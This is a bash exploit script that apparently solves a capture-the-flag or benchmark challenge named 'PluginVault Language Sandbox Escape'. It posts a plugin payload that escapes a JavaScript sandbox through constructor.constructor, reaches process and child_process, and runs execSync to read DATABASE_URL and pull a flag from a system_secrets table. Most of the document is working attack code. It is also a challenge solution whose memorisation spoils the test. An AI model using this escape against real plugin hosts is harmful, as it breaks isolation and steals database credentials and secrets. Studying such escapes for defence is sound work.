#!/usr/bin/env bash
# APEX-052-25 — "PluginVault Language Sandbox Escape" (tags: sandbox_escape, javascript)
#
# The marketplace runs plugin code in a "sandbox" that is a JavaScript context
# with a restricted set of globals. That is not a boundary: every object in
# reach has a `constructor`, and `constructor.constructor` is `Function`, which
# compiles a new function in the *outer* scope. `Function('return process')()`
# ends the sandbox in one expression.
#
# What follows is ordinary Node. `process.mainModule.require` is the real module
# loader, so the allowlist of modules the sandbox maintains stops mattering too,
# and `DATABASE_URL` is in the environment the escape landed in.
#
# The query runs in a child process rather than in the handler, and that is not
# an accident: the plugin's result is read as soon as the code returns, so a
# promise resolving afterwards has nobody left to tell. A synchronous
# `execSync` is what makes the answer arrive in the same response.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex052-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

PLUGIN="$(python3 -c '
import json
query = ("const {Client}=require(\"pg\");"
         "const c=new Client({connectionString:process.env.DATABASE_URL});"
         "c.connect().then(()=>c.query(\"SELECT value FROM system_secrets WHERE key=\x27flag\x27\"))"
         ".then(r=>{console.log(r.rows[0].value);process.exit(0)})"
         ".catch(e=>{console.log(\"ERR \"+e.message);process.exit(1)});")
print("const P = constructor.constructor(\"return process\")();\n"
      "const cp = P.mainModule.require(\"child_process\");\n"
      "result = cp.execSync(\"node -e \" + JSON.stringify(%s), {cwd: \"/app\"}).toString();"
      % json.dumps(query))
')"

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/plugins/execute \
    --set header.Content-Type=application/json \
    --set json.name=string-utils-extended \
    --set "json.code=$PLUGIN" | flag
